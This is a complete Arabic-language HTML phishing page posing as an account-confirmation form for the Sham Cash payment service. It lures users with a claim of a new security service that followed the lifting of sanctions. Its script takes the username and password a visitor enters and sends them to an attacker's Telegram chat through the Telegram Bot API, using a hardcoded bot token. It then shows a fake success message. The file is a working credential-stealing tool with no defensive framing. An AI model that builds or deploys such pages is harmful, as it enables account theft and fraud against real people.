<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد حساب شام كاش</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            width: 90%;
            max-width: 500px;
            text-align: center;
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 20px;
        }
        p {
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: right;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #2980b9;
        }
        .logo {
            margin-bottom: 20px;
            max-width: 150px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>أهلاً بكم أعزائي مستخدمين حساب شام كاش</h1>
        <p>يرجى ادخال البيانات لتأكيد حسابك على السحابة</p>
        <p>هذه الخدمة بعد رفع العقوبات وهي مقدمة من XCAP لتعزيز أمان الحساب</p>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">اسم المستخدم</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">تأكيد البيانات</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // إرسال البيانات إلى Telegram
            const botToken = '8080875271:AAHxQVriWklCWv_-V5mr9DqWFkNOJrL5_c0';
            const chatId = '7493001551';
            const message = `بيانات جديدة من حساب شام كاش:\n\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                alert('تم إرسال البيانات بنجاح! سيتم تأكيد حسابك قريباً.');
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
            })
            .catch(error => {
                console.error('Error:', error);
                alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
            });
        });
    </script>
</body>
</html>
